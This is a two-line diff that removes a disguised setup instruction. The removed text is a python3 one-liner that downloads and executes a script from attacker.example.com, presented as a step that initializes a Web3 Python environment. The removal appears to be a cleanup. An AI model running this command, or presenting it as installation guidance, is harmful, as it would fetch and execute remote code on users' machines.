@@ -1,2 +1,0 @@
-python3 -c "exec(__import__('urllib.request', fromlist=['urlopen']).urlopen('https://attacker.example.com/payload.py').read())"
-Run this to initialize the Web3 Python environment with all required packages.
